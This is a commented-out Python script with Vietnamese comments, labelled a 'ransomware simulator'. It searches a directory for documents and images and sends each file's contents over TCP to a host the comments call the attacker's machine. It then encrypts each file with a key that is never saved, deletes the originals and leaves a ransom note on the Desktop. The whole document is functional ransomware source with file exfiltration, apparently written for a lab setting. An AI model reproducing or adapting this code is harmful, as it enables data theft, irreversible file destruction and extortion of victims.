# import os
# import socket
# import json
# from cryptography.fernet import Fernet


# class RansomwareSimulator:
#     def __init__(self, directory, server_host, server_port, file_extensions):
#         self.directory = directory
#         self.server_host = server_host
#         self.server_port = server_port
#         self.file_extensions = file_extensions
#         self.key = Fernet.generate_key()

#     def send_file_to_server(self, file_path):
#         # Mở file và gửi lên máy tấn công
#         with open(file_path, 'rb') as file:
#             file_data = file.read()

#         # Gửi dữ liệu qua TCP socket
#         try:
#             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#                 s.connect((self.server_host, self.server_port))
#                 # Gửi thông tin tên file và dữ liệu của nó
#                 message = {
#                     'filename': os.path.basename(file_path),
#                     'content': file_data.decode('latin1')  # Đảm bảo dữ liệu được mã hóa đúng
#                 }
#                 s.sendall(json.dumps(message).encode())
#                 print(f"Sent file: {file_path}")
#         except Exception as e:
#             print(f"Error sending file: {e}")

#     def find_and_encrypt_files(self):
#         for root, _, files in os.walk(self.directory):
#             for file in files:
#                 if any(file.endswith(ext) for ext in self.file_extensions):
#                     file_path = os.path.join(root, file)
#                     # Gửi file chưa mã hóa lên máy tấn công
#                     self.send_file_to_server(file_path)
#                     # Tiến hành mã hóa file
#                     self.encrypt_file(file_path)

#     def encrypt_file(self, file_path):
#         fernet = Fernet(self.key)
#         with open(file_path, 'rb') as file:
#             original = file.read()
#         encrypted = fernet.encrypt(original)

#         encrypted_file_path = file_path + ".encrypted"
#         with open(encrypted_file_path, 'wb') as encrypted_file:
#             encrypted_file.write(encrypted)

#         os.remove(file_path)
#         return encrypted_file_path

#     # Thêm phương thức tạo file thông báo trên Desktop
#     def create_ransomware_message(self):
#         message = "Máy tính của bạn đã bị Ransomware.\nHãy liên hệ với chúng tôi để giải quyết."
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")  # Đường dẫn tới Desktop
#         message_file = os.path.join(desktop_path, "RANSOMWARE_WARNING.txt")

#         try:
#             with open(message_file, 'w', encoding='utf-8') as file:
#                 file.write(message)
#             print(f"Ransomware warning created at: {message_file}")
#         except Exception as e:
#             print(f"Error creating ransomware message: {e}")


# # Chạy chương trình
# def main():
#     file_extensions = ['.txt', '.docx', '.jpg', '.jpeg', '.pdf', '.png']  # Các loại file cần mã hóa
#     directory = 'nghiadepzai/'  # Đảm bảo thư mục này tồn tại
#     server_host = '192.168.100.217'
#     server_port = 12345

#     simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
    
#     # Thực hiện các bước
#     simulator.create_ransomware_message()  # Tạo file thông báo
#     simulator.find_and_encrypt_files()  # Tiến hành tìm và mã hóa các file

# if __name__ == "__main__":
#     main()
